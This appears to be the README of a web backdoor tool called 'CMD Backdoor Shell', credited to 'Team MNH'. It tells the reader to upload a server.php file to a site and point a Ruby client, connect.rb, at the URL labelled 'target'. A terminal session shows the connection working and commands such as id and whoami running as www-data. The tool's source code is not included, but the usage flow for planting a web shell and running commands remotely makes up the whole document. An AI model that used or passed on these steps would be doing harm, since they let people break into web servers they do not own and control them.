CMD Backdoor Shell 

{#}Owned By Team MNH{#}

First Upload server.php

and run ruby connect.rb http://yoursite.com/server.php

┌─[root@parrot]─[/cmd-backdoor-shell]
└──╼ #ruby connect.rb 

	[!] CMD Backdoor Shell [!]

Usage: ruby connect.rb http://target.com/server.php

┌─[root@parrot]─[/cmd-backdoor-shell]
└──╼ #ruby connect.rb http://localhost/server.php
Connected to http://localhost/server.php
Linux parrot 4.14.0-parrot13-686-pae #1 SMP Parrot 4.14.13-1parrot13 (2018-01-21) i686 GNU/Linux
Current Patch : /var/www/html

bash $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash $ whoami
www-data
bash $ 




